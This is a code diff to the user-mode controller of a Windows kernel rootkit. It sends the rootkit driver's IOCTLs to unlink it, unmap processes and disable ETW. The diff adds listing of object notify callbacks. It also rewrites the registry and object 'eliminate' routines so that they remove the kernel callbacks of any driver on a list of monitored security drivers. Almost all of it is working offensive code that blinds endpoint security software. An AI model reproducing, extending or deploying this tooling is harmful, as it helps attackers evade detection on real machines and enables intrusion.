@@ -49,6 +49,7 @@ struct threadArgs {
 #define IOCTL_UNLINK_ROOTKIT_DRV CTL_CODE_HIDE(15)
 #define IOCTL_UNMAP_PROC CTL_CODE_HIDE(16)
 #define IOCTL_WIN_ETW_DISABLE CTL_CODE_HIDE(17)
+#define IOCTL_LIST_OBJ_CALLBACKS CTL_CODE_HIDE(18)
 
 
 
@@ -762,6 +763,38 @@ BOOL ListRegCallBack(HANDLE hDevice) {
     return result;
 }
 
+BOOL ListObjCallbacks(HANDLE hDevice) {
+    DWORD bytesReturned;
+    ModulesData* resultArray = NULL;
+    ULONG64 modulesCount = 0;
+    BOOL result;
+    resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 128);
+    result = DeviceIoControl(
+        hDevice,
+        IOCTL_LIST_OBJ_CALLBACKS,
+        NULL,
+        0,
+        resultArray,
+        sizeof(ModulesData) * 128,
+        &bytesReturned,
+        NULL
+    );
+
+    for (int i = 0; i < 64; i++) {
+        if (resultArray[i].ModuleBase) {
+            printf("proc Module name: %s\n", resultArray[i].ModuleName);
+            printf("proc Module addr: %llx\n\n", resultArray[i].ModuleBase);
+        }
+
+    }
+    for (int i = 63; i < 128; i++) {
+        if (resultArray[i].ModuleBase) {
+            printf("thread Module name: %s\n", resultArray[i].ModuleName);
+            printf("thread Module addr: %llx\n\n", resultArray[i].ModuleBase);
+        }
+    }
+    return result;
+}
 
 BOOL ElLoadImageCallback(HANDLE hDevice) {
     DWORD bytesReturned;
@@ -830,7 +863,6 @@ BOOL ElLoadImageCallback(HANDLE hDevice) {
     return result;
 }
 
-
 BOOL ElRegCallBack(HANDLE hDevice) {
     DWORD bytesReturned;
     ModulesData* resultArray = NULL;
@@ -841,7 +873,7 @@ BOOL ElRegCallBack(HANDLE hDevice) {
 
     result = DeviceIoControl(
         hDevice,
-        IOCTL_LIST_PROC_CALLBACK,
+        IOCTL_LIST_REG_CALLBACK,
         NULL,
         0,
         resultArray,
@@ -862,11 +894,11 @@ BOOL ElRegCallBack(HANDLE hDevice) {
     for (size_t i = 0; i < 64; i++) {
         if (resultArray[i].ModuleBase == 0)
             continue;
-        printf("Process Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
+        printf("registry Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
 
         for (size_t j = 0; j < 104; j++) {
             if (_stricmp(resultArray[i].ModuleName, monitoredDrivers[j]) == 0) {
-                printf("Removing Process Notify Callback %s at base address 0x%llx\n", resultArray[i].ModuleName, resultArray[i].ModuleBase);
+                printf("Removing registry Notify Callback %s at base address 0x%llx\n", resultArray[i].ModuleName, resultArray[i].ModuleBase);
                 DWORD bytesReturnedRem;
                 BOOL remResult = DeviceIoControl(
                     hDevice,
@@ -886,7 +918,7 @@ BOOL ElRegCallBack(HANDLE hDevice) {
                 }
             }
         }
-        printf("Process Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
+        printf("registry Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
     }
     
     return result;
@@ -897,22 +929,59 @@ BOOL ElObjCallBack(HANDLE hDevice) {
     ModulesData* resultArray = NULL;
     ULONG64 modulesCount = 0;
     BOOL result;
+
+    resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 128);
+
     result = DeviceIoControl(
         hDevice,
-        IOCTL_REM_OBJ_CALLBACK,
+        IOCTL_LIST_OBJ_CALLBACKS,
         NULL,
         0,
-        NULL,
-        0,
+        resultArray,
+        sizeof(ModulesData) * 128,
         &bytesReturned,
         NULL
     );
-    if (!result) {
-        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
+    if (resultArray == NULL) {
+        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
+        free(resultArray);
+        return FALSE;
     }
-    else {
-        printf("Successfully removed object notify routine callback.\n");
+    if (bytesReturned == 0) {
+        fprintf(stderr, "No data returned from driver.\n");
+        free(resultArray);
+        return FALSE;
     }
+    for (size_t i = 0; i < 128; i++) {
+        if (resultArray[i].ModuleBase == 0)
+            continue;
+        printf("object Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
+
+        for (size_t j = 0; j < 104; j++) {
+            if (_stricmp(resultArray[i].ModuleName, monitoredDrivers[j]) == 0) {
+                printf("Removing object Notify Callback %s at base address 0x%llx\n", resultArray[i].ModuleName, resultArray[i].ModuleBase);
+                DWORD bytesReturnedRem;
+                BOOL remResult = DeviceIoControl(
+                    hDevice,
+                    IOCTL_REM_OBJ_CALLBACK,
+                    &resultArray[i].ModuleName,
+                    sizeof(resultArray[i].ModuleName),
+                    NULL,
+                    0,
+                    &bytesReturnedRem,
+                    NULL
+                );
+                if (remResult) {
+                    printf("Successfully removed callback for %s\n", resultArray[i].ModuleName);
+                }
+                else {
+                    fprintf(stderr, "Failed to remove callback for %s. Error: %lu\n", resultArray[i].ModuleName, GetLastError());
+                }
+            }
+        }
+        printf("object Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
+    }
+
     return result;
 }
 
@@ -1214,6 +1283,9 @@ int main(int argc, char* argv[])
         else if (strncmp(input, "listreg", 7) == 0) {
             ListRegCallBack(hDevice);
 		}
+        else if (strncmp(input, "listobj", 7) == 0) {
+            ListObjCallbacks(hDevice);
+        }
         else if (strncmp(input, "elproccallback", 14) == 0) {
             BOOL result = ElProcCallback(hDevice);
             if (result) {
@@ -1375,7 +1447,8 @@ int main(int argc, char* argv[])
             printf(" - listproc             - List process notify routines\n");
             printf(" - listthread           - List thread notify routines\n");
 			printf(" - listloadimage        - List load image notify routines\n");
-			printf(" - listreg              - List registry notify routines (only prints in KD)\n");
+			printf(" - listreg              - List registry notify routines \n");
+            printf(" - listobj              - List objects notify routines \n");
 			printf(" - elproccallback       - Eliminate process notify routine callback\n");
 			printf(" - elthreadcallback     - Eliminate thread notify routine callback\n");
 			printf(" - elloadimagecallback  - Eliminate load image notify routine callback\n");
